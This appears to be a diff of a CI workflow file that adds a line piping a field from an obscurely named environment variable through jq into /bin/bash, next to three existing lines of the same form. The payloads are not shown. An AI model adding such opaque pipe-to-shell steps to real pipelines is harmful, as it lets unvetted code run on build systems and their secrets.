@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$uya717" | jq -r .xtcl3939 | /bin/bash
           printf '%s' "$hj39" | jq -r .gaxf7 | /bin/bash
           echo $dtof77 | jq -r .vbyj7338 | /bin/bash
+          printf '%s' "$ftyy3557" | jq -r .arkt0 | /bin/bash
 
       - name: Archive results
         if: always()
